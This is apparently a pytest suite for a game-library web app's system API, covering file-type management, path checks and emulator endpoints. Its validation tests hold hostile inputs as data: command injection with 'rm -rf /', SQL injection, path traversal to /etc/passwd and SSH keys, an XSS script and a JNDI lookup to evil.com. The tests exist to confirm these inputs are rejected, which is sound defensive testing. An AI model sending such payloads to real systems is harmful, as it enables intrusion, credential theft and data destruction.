import pytest
import json
import os
import tempfile
from unittest.mock import patch, MagicMock
from uuid import uuid4
from pathlib import Path

from modules import db
from modules.models import User, AllowedFileType, IgnoredFileType
from modules.platform import LibraryPlatform, Emulator


def safe_cleanup_database(db_session):
    """Completely clean up ALL test data - this is a test database, nuke everything!"""
    from sqlalchemy import text
    
    try:
        # Disable foreign key checks temporarily for aggressive cleanup
        db_session.execute(text("SET session_replication_role = replica;"))
        
        # Delete all junction table data first
        db_session.execute(text("TRUNCATE TABLE user_favorites CASCADE"))
        db_session.execute(text("TRUNCATE TABLE game_genre_association CASCADE"))
        db_session.execute(text("TRUNCATE TABLE game_platform_association CASCADE"))
        db_session.execute(text("TRUNCATE TABLE game_game_mode_association CASCADE"))
        db_session.execute(text("TRUNCATE TABLE game_theme_association CASCADE"))
        
        # Delete all main table data
        for table in ['allowed_file_types', 'ignored_file_types', 'game_updates', 'game_extras', 
                     'images', 'game_urls', 'unmatched_folders', 'scan_jobs', 'download_requests', 
                     'newsletters', 'system_events', 'invite_tokens', 'games', 'users', 'libraries']:
            try:
                db_session.execute(text(f"TRUNCATE TABLE {table} RESTART IDENTITY CASCADE"))
            except Exception:
                pass  # Table might not exist
        
        # Re-enable foreign key checks
        db_session.execute(text("SET session_replication_role = DEFAULT;"))
        
        db_session.commit()
        print("✅ Nuked all test database data!")
        
    except Exception as e:
        db_session.rollback()
        print(f"❌ Error during aggressive cleanup: {e}")
        # Try a simpler approach if the aggressive one fails
        try:
            # Re-enable foreign key checks first
            db_session.execute(text("SET session_replication_role = DEFAULT;"))
            db_session.commit()
        except:
            pass


@pytest.fixture(autouse=True)
def cleanup_after_each_test(db_session):
    """Automatically clean up after each test - no test data should persist!"""
    yield  # Let the test run first
    safe_cleanup_database(db_session)  # Clean up after


@pytest.fixture
def admin_user(db_session):
    """Create an admin user for testing."""
    admin_uuid = str(uuid4())
    unique_id = str(uuid4())[:8]
    admin = User(
        user_id=admin_uuid,
        name=f'TestAdmin_{unique_id}',
        email=f'admin_{unique_id}@test.com',
        role='admin',
        is_email_verified=True
    )
    admin.set_password('testpass123')
    db_session.add(admin)
    db_session.commit()
    return admin


@pytest.fixture
def regular_user(db_session):
    """Create a regular user for testing."""
    user_uuid = str(uuid4())
    unique_id = str(uuid4())[:8]
    user = User(
        user_id=user_uuid,
        name=f'TestUser_{unique_id}',
        email=f'user_{unique_id}@test.com',
        role='user',
        is_email_verified=True
    )
    user.set_password('testpass123')
    db_session.add(user)
    db_session.commit()
    return user


@pytest.fixture
def sample_allowed_file_type(db_session):
    """Create a sample allowed file type."""
    file_type = AllowedFileType(value='.exe')
    db_session.add(file_type)
    db_session.commit()
    return file_type


@pytest.fixture
def sample_ignored_file_type(db_session):
    """Create a sample ignored file type."""
    file_type = IgnoredFileType(value='.tmp')
    db_session.add(file_type)
    db_session.commit()
    return file_type


class TestFileTypeManagement:
    """Tests for file type management endpoints with security validations."""
    
    def test_invalid_type_category(self, client, admin_user):
        """Test invalid type category returns 400."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/file_types/invalid')
        assert response.status_code == 400
        data = response.get_json()
        assert data['error'] == 'Invalid type category'
    
    def test_requires_admin_access(self, client, regular_user):
        """Test that file type management requires admin access."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/file_types/allowed')
        # Regular users should get 302 redirect or 403 forbidden
        assert response.status_code in [302, 403]
    
    def test_requires_authentication(self, client):
        """Test that file type management requires authentication."""
        response = client.get('/api/file_types/allowed')
        assert response.status_code == 302
        assert 'login' in response.location

    def test_get_allowed_file_types(self, client, admin_user, sample_allowed_file_type):
        """Test retrieving allowed file types."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/file_types/allowed')
        assert response.status_code == 200
        
        data = response.get_json()
        assert isinstance(data, list)
        assert len(data) >= 1
        assert any(item['value'] == '.exe' for item in data)

    def test_get_ignored_file_types(self, client, admin_user, sample_ignored_file_type):
        """Test retrieving ignored file types."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/file_types/ignored')
        assert response.status_code == 200
        
        data = response.get_json()
        assert isinstance(data, list)
        assert len(data) >= 1
        assert any(item['value'] == '.tmp' for item in data)

    def test_create_allowed_file_type_success(self, client, admin_user):
        """Test successfully creating an allowed file type."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.post('/api/file_types/allowed',
                             json={'value': 'msi'},
                             content_type='application/json')
        
        assert response.status_code == 201
        data = response.get_json()
        assert data['value'] == '.msi'
        assert 'id' in data

    def test_create_file_type_invalid_json(self, client, admin_user):
        """Test creating file type with invalid JSON."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.post('/api/file_types/allowed',
                             data='invalid json',
                             content_type='application/json')
        
        assert response.status_code == 400
        data = response.get_json()
        assert 'Invalid JSON format' in data['error']

    def test_create_file_type_missing_value(self, client, admin_user):
        """Test creating file type without value field."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.post('/api/file_types/allowed',
                             json={'not_value': 'test'},
                             content_type='application/json')
        
        assert response.status_code == 400
        data = response.get_json()
        assert 'Missing required field: value' in data['error']

    def test_create_file_type_invalid_value_format(self, client, admin_user):
        """Test creating file type with invalid value format."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        # Test various invalid formats
        invalid_values = [
            '',  # Empty
            'exe;rm -rf /',  # Command injection attempt
            '../../../etc/passwd',  # Path traversal attempt
            'very_long_extension_that_exceeds_limit',  # Too long
            'exe with spaces',  # Spaces not allowed
            'exe@#$%',  # Special characters
        ]
        
        for invalid_value in invalid_values:
            response = client.post('/api/file_types/allowed',
                                 json={'value': invalid_value},
                                 content_type='application/json')
            
            assert response.status_code == 400
            data = response.get_json()
            assert 'Invalid file type format' in data['error']

    def test_create_file_type_duplicate(self, client, admin_user, sample_allowed_file_type):
        """Test creating duplicate file type returns 409."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.post('/api/file_types/allowed',
                             json={'value': 'exe'},  # Already exists
                             content_type='application/json')
        
        assert response.status_code == 409
        data = response.get_json()
        assert 'File type already exists' in data['error']

    def test_update_file_type_success(self, client, admin_user, sample_allowed_file_type):
        """Test successfully updating a file type."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.put('/api/file_types/allowed',
                            json={'id': sample_allowed_file_type.id, 'value': 'msi'},
                            content_type='application/json')
        
        assert response.status_code == 200
        data = response.get_json()
        assert data['value'] == '.msi'

    def test_update_file_type_missing_fields(self, client, admin_user):
        """Test updating file type with missing required fields."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        # Missing 'id' field
        response = client.put('/api/file_types/allowed',
                            json={'value': 'msi'},
                            content_type='application/json')
        
        assert response.status_code == 400
        data = response.get_json()
        assert 'Missing required field: id' in data['error']

    def test_update_file_type_invalid_id(self, client, admin_user):
        """Test updating file type with invalid ID format."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.put('/api/file_types/allowed',
                            json={'id': 'not_a_number', 'value': 'msi'},
                            content_type='application/json')
        
        assert response.status_code == 400
        data = response.get_json()
        assert 'Invalid ID format' in data['error']

    def test_update_file_type_not_found(self, client, admin_user):
        """Test updating non-existent file type."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.put('/api/file_types/allowed',
                            json={'id': 99999, 'value': 'msi'},
                            content_type='application/json')
        
        assert response.status_code == 404
        data = response.get_json()
        assert 'File type not found' in data['error']

    def test_delete_file_type_success(self, client, admin_user, sample_allowed_file_type):
        """Test successfully deleting a file type."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.delete('/api/file_types/allowed',
                               json={'id': sample_allowed_file_type.id},
                               content_type='application/json')
        
        assert response.status_code == 200
        data = response.get_json()
        assert data['success'] is True

    def test_delete_file_type_invalid_id(self, client, admin_user):
        """Test deleting file type with invalid ID."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.delete('/api/file_types/allowed',
                               json={'id': 'invalid'},
                               content_type='application/json')
        
        assert response.status_code == 400
        data = response.get_json()
        assert 'Invalid ID format' in data['error']

    def test_delete_file_type_not_found(self, client, admin_user):
        """Test deleting non-existent file type."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        response = client.delete('/api/file_types/allowed',
                               json={'id': 99999},
                               content_type='application/json')
        
        assert response.status_code == 404
        data = response.get_json()
        assert 'File type not found' in data['error']


class TestFileTypeValidation:
    """Tests for file type value validation and sanitization."""
    
    def test_valid_file_extensions(self, client, admin_user):
        """Test various valid file extension formats."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        valid_extensions = ['.exe', 'msi', '.zip', 'tar.gz', '.7z', 'deb']
        expected_results = ['.exe', '.msi', '.zip', '.tar.gz', '.7z', '.deb']
        
        for i, ext in enumerate(valid_extensions):
            response = client.post('/api/file_types/allowed',
                                 json={'value': ext},
                                 content_type='application/json')
            
            assert response.status_code == 201
            data = response.get_json()
            assert data['value'] == expected_results[i]

    def test_security_validation_prevents_injection(self, client, admin_user):
        """Test that security validation prevents various injection attempts."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        malicious_inputs = [
            '.exe; DROP TABLE users;',
            '../../../etc/passwd',
            'exe\x00.txt',
            '.exe OR 1=1',
            '<script>alert("xss")</script>',
            '${jndi:ldap://evil.com/}',
            '${env:PATH}',
        ]
        
        for malicious_input in malicious_inputs:
            response = client.post('/api/file_types/allowed',
                                 json={'value': malicious_input},
                                 content_type='application/json')
            
            assert response.status_code == 400
            data = response.get_json()
            assert 'Invalid file type format' in data['error']


class TestPathAvailabilityCheck:
    """Tests for path availability check with security validation."""
    
    def test_requires_authentication(self, client):
        """Test that path check requires authentication."""
        response = client.get('/api/check_path_availability?full_disk_path=/test/path')
        assert response.status_code == 302
        assert 'login' in response.location

    def test_missing_path_parameter(self, client, regular_user):
        """Test missing path parameter returns 400."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/check_path_availability')
        assert response.status_code == 400
        data = response.get_json()
        assert data['available'] is False
        assert 'Path parameter required' in data['error']

    def test_empty_path_parameter(self, client, regular_user):
        """Test empty path parameter returns 400."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/check_path_availability?full_disk_path=')
        assert response.status_code == 400
        data = response.get_json()
        assert data['available'] is False
        assert 'Path parameter required' in data['error']

    def test_no_allowed_bases_configured(self, client, regular_user, app):
        """Test when no allowed base directories are configured."""
        with app.test_request_context():
            with patch.dict(app.config, {'BASE_FOLDER_WINDOWS': None, 'BASE_FOLDER_POSIX': None, 'DATA_FOLDER_WAREZ': None}):
                with client.session_transaction() as sess:
                    sess['_user_id'] = str(regular_user.id)
                    sess['_fresh'] = True
                
                response = client.get('/api/check_path_availability?full_disk_path=/test/path')
                assert response.status_code == 500
                data = response.get_json()
                assert data['available'] is False
                assert 'Service configuration error' in data['error']

    def test_path_traversal_prevention(self, client, regular_user, app):
        """Test that path traversal attacks are prevented."""
        with app.test_request_context():
            with patch.dict(app.config, {
                'DATA_FOLDER_WAREZ': '/allowed/games',
                'BASE_FOLDER_WINDOWS': None,
                'BASE_FOLDER_POSIX': None
            }):
                with client.session_transaction() as sess:
                    sess['_user_id'] = str(regular_user.id)
                    sess['_fresh'] = True
                
                malicious_paths = [
                    '../../../etc/passwd',
                    '/allowed/games/../../../etc/passwd',
                    '..\\..\\..\\windows\\system32',
                    '/allowed/games/../../sensitive/data',
                    '/etc/passwd',
                    '/root/.ssh/id_rsa',
                ]
                
                for path in malicious_paths:
                    response = client.get(f'/api/check_path_availability?full_disk_path={path}')
                    assert response.status_code == 403
                    data = response.get_json()
                    assert data['available'] is False
                    assert 'Access denied' in data['error'] or 'outside allowed directories' in data['error']

    @patch('modules.routes_apis.system.current_app', spec=True)
    @patch('modules.routes_apis.system.Path', spec=True)
    def test_valid_path_exists(self, mock_path_class, mock_app, client, regular_user):
        """Test checking existence of valid path that exists."""
        mock_app.config.get.side_effect = lambda key: {
            'DATA_FOLDER_WAREZ': '/allowed/games',
            'BASE_FOLDER_WINDOWS': None,
            'BASE_FOLDER_POSIX': None
        }.get(key)
        
        mock_path_obj = MagicMock()
        mock_path_obj.resolve.return_value = mock_path_obj
        mock_path_obj.exists.return_value = True
        mock_path_class.return_value = mock_path_obj
        
        # Mock is_safe_path to return True for valid paths
        with patch('modules.routes_apis.system.is_safe_path') as mock_safe_path:
            mock_safe_path.return_value = (True, None)
            
            with client.session_transaction() as sess:
                sess['_user_id'] = str(regular_user.id)
                sess['_fresh'] = True
            
            response = client.get('/api/check_path_availability?full_disk_path=/allowed/games/test.exe')
            assert response.status_code == 200
            data = response.get_json()
            assert data['available'] is True

    @patch('modules.routes_apis.system.current_app', spec=True)
    @patch('modules.routes_apis.system.Path', spec=True)
    def test_valid_path_does_not_exist(self, mock_path_class, mock_app, client, regular_user):
        """Test checking existence of valid path that doesn't exist."""
        mock_app.config.get.side_effect = lambda key: {
            'DATA_FOLDER_WAREZ': '/allowed/games',
            'BASE_FOLDER_WINDOWS': None,
            'BASE_FOLDER_POSIX': None
        }.get(key)
        
        mock_path_obj = MagicMock()
        mock_path_obj.resolve.return_value = mock_path_obj
        mock_path_obj.exists.return_value = False
        mock_path_class.return_value = mock_path_obj
        
        with patch('modules.routes_apis.system.is_safe_path') as mock_safe_path:
            mock_safe_path.return_value = (True, None)
            
            with client.session_transaction() as sess:
                sess['_user_id'] = str(regular_user.id)
                sess['_fresh'] = True
            
            response = client.get('/api/check_path_availability?full_disk_path=/allowed/games/nonexistent.exe')
            assert response.status_code == 200
            data = response.get_json()
            assert data['available'] is False

    @patch('modules.routes_apis.system.current_app', spec=True)
    @patch('modules.routes_apis.system.Path', spec=True)
    def test_path_resolution_error(self, mock_path_class, mock_app, client, regular_user):
        """Test handling of path resolution errors."""
        mock_app.config.get.side_effect = lambda key: {
            'DATA_FOLDER_WAREZ': '/allowed/games',
            'BASE_FOLDER_WINDOWS': None,
            'BASE_FOLDER_POSIX': None
        }.get(key)
        mock_app.logger.warning = MagicMock()
        
        mock_path_obj = MagicMock()
        mock_path_obj.resolve.side_effect = OSError("Permission denied")
        mock_path_class.return_value = mock_path_obj
        
        with patch('modules.routes_apis.system.is_safe_path') as mock_safe_path:
            mock_safe_path.return_value = (True, None)
            
            with client.session_transaction() as sess:
                sess['_user_id'] = str(regular_user.id)
                sess['_fresh'] = True
            
            response = client.get('/api/check_path_availability?full_disk_path=/allowed/games/test.exe')
            assert response.status_code == 500
            data = response.get_json()
            assert data['available'] is False
            assert 'Unable to check path' in data['error']


class TestEmulatorEndpoints:
    """Tests for emulator listing endpoints."""
    
    def test_requires_authentication(self, client):
        """Test that emulator endpoints require authentication."""
        response = client.get('/api/emulators')
        assert response.status_code == 302
        assert 'login' in response.location

    def test_get_all_emulators(self, client, regular_user):
        """Test retrieving all emulators."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/emulators')
        assert response.status_code == 200
        
        data = response.get_json()
        assert 'emulators' in data
        assert isinstance(data['emulators'], list)
        assert len(data['emulators']) > 0

    def test_get_platform_specific_emulators(self, client, regular_user):
        """Test retrieving emulators for a specific platform."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        # Test with a valid platform (assuming PCWIN exists)
        response = client.get('/api/emulators/PCWIN')
        assert response.status_code in [200, 404]  # Might not have emulators for this platform
        
        if response.status_code == 200:
            data = response.get_json()
            assert 'emulators' in data
            assert isinstance(data['emulators'], list)

    def test_invalid_platform_parameter(self, client, regular_user):
        """Test invalid platform parameter validation."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        # Test extremely long platform name
        long_platform = 'A' * 100
        response = client.get(f'/api/emulators/{long_platform}')
        assert response.status_code == 400
        data = response.get_json()
        assert 'Invalid platform parameter' in data['error']

    def test_nonexistent_platform(self, client, regular_user):
        """Test requesting emulators for non-existent platform."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/emulators/NONEXISTENT_PLATFORM')
        assert response.status_code == 404
        data = response.get_json()
        assert 'Platform not supported' in data['error']

    @patch('modules.routes_apis.system.Emulator', spec=True)
    def test_emulator_retrieval_error_handling(self, mock_emulator, client, regular_user):
        """Test error handling when emulator retrieval fails."""
        mock_emulator.__iter__.side_effect = Exception("Database error")
        
        with client.session_transaction() as sess:
            sess['_user_id'] = str(regular_user.id)
            sess['_fresh'] = True
        
        response = client.get('/api/emulators')
        assert response.status_code == 500
        data = response.get_json()
        assert 'Unable to retrieve emulators' in data['error']


class TestSecurityHelperFunctions:
    """Tests for security helper functions."""
    
    def test_validate_file_type_value_valid_inputs(self):
        """Test file type validation with valid inputs."""
        from modules.routes_apis.system import validate_file_type_value
        
        valid_inputs = [
            ('exe', '.exe'),
            ('.msi', '.msi'),
            ('ZIP', '.zip'),
            ('.tar.gz', '.tar.gz'),
            ('7z', '.7z'),
        ]
        
        for input_val, expected in valid_inputs:
            result = validate_file_type_value(input_val)
            assert result == expected

    def test_validate_file_type_value_invalid_inputs(self):
        """Test file type validation with invalid inputs."""
        from modules.routes_apis.system import validate_file_type_value
        
        invalid_inputs = [
            None,
            '',
            'exe; DROP TABLE users;',
            '../../../etc/passwd',
            'very_long_extension_name',
            'exe with spaces',
            'exe@#$%',
            123,  # Non-string
            [],   # Non-string
        ]
        
        for invalid_input in invalid_inputs:
            result = validate_file_type_value(invalid_input)
            assert result is None

    def test_is_safe_path_valid_paths(self):
        """Test path safety validation with valid paths."""
        from modules.routes_apis.system import is_safe_path
        
        allowed_bases = ['/allowed/games', '/allowed/apps']
        
        valid_paths = [
            '/allowed/games/test.exe',
            '/allowed/apps/installer.msi',
            '/allowed/games/subfolder/game.zip',
        ]
        
        for path in valid_paths:
            # Mock Path behavior for testing
            with patch('modules.routes_apis.system.Path', spec=True) as mock_path:
                mock_path_obj = MagicMock()
                mock_path_obj.relative_to = MagicMock()  # Won't raise ValueError for valid paths
                mock_path.return_value.resolve.return_value = mock_path_obj
                
                is_safe, error = is_safe_path(path, allowed_bases)
                assert is_safe is True
                assert error is None

    def test_is_safe_path_invalid_paths(self):
        """Test path safety validation with invalid paths."""
        from modules.routes_apis.system import is_safe_path
        
        allowed_bases = ['/allowed/games']
        
        invalid_paths = [
            '',
            None,
            123,
            [],
            '../../../etc/passwd',
            '/etc/passwd',
            '/root/.ssh/id_rsa',
        ]
        
        for path in invalid_paths:
            is_safe, error = is_safe_path(path, allowed_bases)
            assert is_safe is False
            assert error is not None

    def test_validate_json_input_valid(self, app):
        """Test JSON input validation with valid data."""
        from modules.routes_apis.system import validate_json_input
        
        with app.test_request_context(json={'value': 'test', 'id': 123}):
            data, error = validate_json_input(['value'])
            assert data == {'value': 'test', 'id': 123}
            assert error is None

    def test_validate_json_input_missing_fields(self, app):
        """Test JSON input validation with missing required fields."""
        from modules.routes_apis.system import validate_json_input
        
        with app.test_request_context(json={'id': 123}):
            data, error = validate_json_input(['value', 'id'])
            assert data is None
            assert 'Missing required field: value' in error

    def test_validate_json_input_not_json(self, app):
        """Test JSON input validation with non-JSON request."""
        from modules.routes_apis.system import validate_json_input
        
        with app.test_request_context(data='not json', content_type='text/plain'):
            data, error = validate_json_input()
            assert data is None
            assert 'Request must be JSON' in error


class TestSystemApiBlueprint:
    """Test system API blueprint registration and routing."""
    
    def test_system_routes_registered(self, app):
        """Test that system API routes are properly registered."""
        with app.test_request_context():
            from flask import url_for
            
            # Test that routes exist
            assert url_for('apis.manage_file_types', type_category='allowed') == '/api/file_types/allowed'
            assert url_for('apis.check_path_availability') == '/api/check_path_availability'
            assert url_for('apis.get_emulators') == '/api/emulators'

    def test_system_routes_authentication_required(self, client):
        """Test that all system API routes require authentication."""
        endpoints = [
            '/api/file_types/allowed',
            '/api/check_path_availability?full_disk_path=/test',
            '/api/emulators',
            '/api/emulators/PCWIN'
        ]
        
        for endpoint in endpoints:
            response = client.get(endpoint)
            assert response.status_code == 302
            assert 'login' in response.location


class TestSystemApiIntegration:
    """Integration tests for system API functionality."""
    
    def test_file_type_lifecycle(self, client, admin_user):
        """Test complete file type lifecycle: create, read, update, delete."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        # Create
        create_response = client.post('/api/file_types/allowed',
                                    json={'value': 'pkg'},
                                    content_type='application/json')
        assert create_response.status_code == 201
        file_type_data = create_response.get_json()
        file_type_id = file_type_data['id']
        
        # Read
        read_response = client.get('/api/file_types/allowed')
        assert read_response.status_code == 200
        file_types = read_response.get_json()
        assert any(ft['id'] == file_type_id for ft in file_types)
        
        # Update
        update_response = client.put('/api/file_types/allowed',
                                   json={'id': file_type_id, 'value': 'dmg'},
                                   content_type='application/json')
        assert update_response.status_code == 200
        updated_data = update_response.get_json()
        assert updated_data['value'] == '.dmg'
        
        # Delete
        delete_response = client.delete('/api/file_types/allowed',
                                      json={'id': file_type_id},
                                      content_type='application/json')
        assert delete_response.status_code == 200
        assert delete_response.get_json()['success'] is True

    def test_error_response_consistency(self, client, admin_user):
        """Test that error responses follow consistent format across endpoints."""
        with client.session_transaction() as sess:
            sess['_user_id'] = str(admin_user.id)
            sess['_fresh'] = True
        
        # Test various error scenarios
        error_responses = [
            client.post('/api/file_types/allowed', json={'invalid': 'data'}),
            client.put('/api/file_types/allowed', json={'id': 'invalid', 'value': 'test'}),
            client.delete('/api/file_types/allowed', json={'id': 99999}),
            client.get('/api/check_path_availability'),
            client.get('/api/emulators/INVALID_PLATFORM'),
        ]
        
        for response in error_responses:
            assert response.status_code in [400, 403, 404, 500]
            data = response.get_json()
            assert 'error' in data
            assert isinstance(data['error'], str)
            assert len(data['error']) > 0